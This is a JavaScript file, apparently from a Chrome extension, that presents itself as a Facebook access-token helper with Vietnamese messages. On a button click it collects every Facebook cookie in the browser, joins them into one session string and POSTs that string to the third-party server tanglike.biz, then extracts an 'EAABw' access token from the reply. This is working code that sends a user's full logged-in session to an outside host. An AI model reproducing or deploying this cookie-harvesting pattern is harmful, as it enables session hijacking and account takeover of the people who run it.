function sendPostRequest(cookieString) {
  const url = 'https://tanglike.biz/gettokenig.php';

  // Data to be sent in the form
  const formData = {
    cookie: cookieString,
    submit: 'Get token'
  };

  // Make the POST request with jQuery
  $.ajax({
    url: url,
    method: 'POST',
    data: formData,
    success: function(response) {
      // console.log('Response from POST request:', response);
      // Optionally display the response in the popup
      if(response.includes("Cookie die")){
		 $('#token').val("Cookie lỗi, hãy login lại thử lại"); 
	  }else if(response.includes("EAABw")){
		  let token = "EAABw" + response.split('EAABw')[1].split('</textarea>')[0];
	  $('#token').val(token);
	  }else{
		$('#token').val("Lỗi, hãy báo cho admin");  
	  }
    },
    error: function(xhr, status, error) {
      // console.error('Error during POST request:', error);
	  $('#token').val("Lỗi, hãy báo cho admin");
    }
  });
}
$(document).ready(function(){
$("#laytk").click(function(){
					// var inv = setInterval(function() {
						 chrome.runtime.sendMessage({ action: 'getFacebookCookies' }, function(response) {
						
							// console.log(response);
						  if (response && response.cookies) {
						  let cookieString = '';
						  
						  // Concatenate cookies in the format: name=data; name1=data1; ...
						  response.cookies.forEach((cookie, index) => {
							cookieString += `${cookie.name}=${cookie.value}`;
							if (index < response.cookies.length - 1) {
							  cookieString += '; ';
							}
						  });
						sendPostRequest(cookieString);
							
						  // Display the concatenated cookie string
						  // console.log(cookieString);
						  
						}
						}
					  );
						// clearInterval(inv);
					// }, 500)
		});
});